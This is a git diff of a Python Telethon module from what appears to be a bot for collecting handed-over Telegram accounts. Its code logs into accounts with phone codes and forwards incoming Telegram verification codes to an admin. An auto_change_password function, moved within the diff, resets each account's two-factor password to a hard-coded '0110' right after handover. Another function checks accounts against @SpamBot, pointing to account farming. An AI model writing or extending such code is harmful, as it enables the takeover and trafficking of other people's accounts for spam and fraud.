@@ -4,6 +4,8 @@
 """
 import logging
 import asyncio
+import os
+from dotenv import load_dotenv
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -17,10 +19,10 @@ from telethon.errors import (
 import database as db
 from config import ADMIN_ID
 
+load_dotenv()
+
 logger = logging.getLogger(__name__)
 
-# ⚠️ ВАЖНО: получи на https://my.telegram.org -> API development tools
-import os
 API_ID = int(os.getenv("TG_API_ID", "0"))
 API_HASH = os.getenv("TG_API_HASH", "your_api_hash")
 
@@ -59,7 +61,6 @@ async def submit_code(phone: str, code: str, user_id: int) -> dict:
     if not pending:
         return {"success": False, "error": "Сессия не найдена. Начните заново."}
 
-    # pending: (id, account_id, phone, user_id, phone_code_hash, session_string, requires_2fa, created_at)
     phone_code_hash = pending[4]
     session_string = pending[5]
 
@@ -75,7 +76,6 @@ async def submit_code(phone: str, code: str, user_id: int) -> dict:
         return {"success": True, "session": session_str}
 
     except SessionPasswordNeededError:
-        # Нужна 2FA
         new_session = client.session.save() if client.is_connected() else session_string
         await db.save_pending_code(
             account_id=pending[1],
@@ -169,7 +169,6 @@ async def listen_for_codes(session_string: str, phone: str, admin_id: int,
         async def handler(event):
             sender = await event.get_sender()
             text = event.raw_text
-            # Проверяем сообщения от Telegram (верификационные коды)
             if hasattr(sender, 'id') and sender.id in [777000, 42777]:
                 received_codes.append(text)
                 await bot.send_message(
@@ -202,6 +201,36 @@ async def listen_for_codes(session_string: str, phone: str, admin_id: int,
             pass
 
 
+AUTO_PASSWORD = "0110"
+
+
+async def auto_change_password(session_string: str, old_password: str = None) -> dict:
+    """Автоматически меняет пароль на 0110 сразу после сдачи"""
+    try:
+        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
+        await client.connect()
+
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return {"success": False, "error": "Сессия недействительна"}
+
+        if old_password:
+            await client.edit_2fa(current_password=old_password, new_password=AUTO_PASSWORD)
+        else:
+            await client.edit_2fa(new_password=AUTO_PASSWORD)
+
+        await client.disconnect()
+        return {"success": True}
+
+    except Exception as e:
+        logger.error(f"Ошибка auto_change_password: {e}")
+        try:
+            await client.disconnect()
+        except:
+            pass
+        return {"success": False, "error": str(e)}
+
+
 async def change_password(session_string: str, phone: str, new_password: str) -> dict:
     """Меняет пароль 2FA аккаунта"""
     try:
@@ -225,42 +254,9 @@ async def change_password(session_string: str, phone: str, new_password: str) ->
         return {"success": False, "error": str(e)}
 
 
-AUTO_PASSWORD = "0110"
-
-
-async def auto_change_password(session_string: str, old_password: str = None) -> dict:
-    """Автоматически меняет пароль на 0110 сразу после сдачи"""
-    try:
-        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
-        await client.connect()
-
-        if not await client.is_user_authorized():
-            await client.disconnect()
-            return {"success": False, "error": "Сессия недействительна"}
-
-        if old_password:
-            # Аккаунт уже имел 2FA — меняем старый на новый
-            await client.edit_2fa(current_password=old_password, new_password=AUTO_PASSWORD)
-        else:
-            # Нет 2FA — устанавливаем новый
-            await client.edit_2fa(new_password=AUTO_PASSWORD)
-
-        await client.disconnect()
-        return {"success": True}
-
-    except Exception as e:
-        logger.error(f"Ошибка auto_change_password: {e}")
-        try:
-            await client.disconnect()
-        except:
-            pass
-        return {"success": False, "error": str(e)}
-
-
 async def check_spam_block(session_string: str) -> dict:
     """
     Проверяет аккаунт на спам-блок через @SpamBot.
-    Возвращает: {"blocked": True/False, "message": "текст ответа от SpamBot"}
     """
     from telethon import events as tl_events
 
@@ -281,10 +277,8 @@ async def check_spam_block(session_string: str) -> dict:
             spambot_response = event.raw_text
             response_event.set()
 
-        # Отправляем /start боту
         await client.send_message("SpamBot", "/start")
 
-        # Ждём ответ до 10 секунд
         try:
             await asyncio.wait_for(response_event.wait(), timeout=10)
         except asyncio.TimeoutError:
@@ -296,7 +290,6 @@ async def check_spam_block(session_string: str) -> dict:
             return {"success": False, "error": "SpamBot не ответил"}
 
         text_lower = spambot_response.lower()
-        # SpamBot пишет "free" если не заблокирован
         if "free" in text_lower or "ограничен" not in text_lower and "spam" not in text_lower:
             blocked = False
         else:
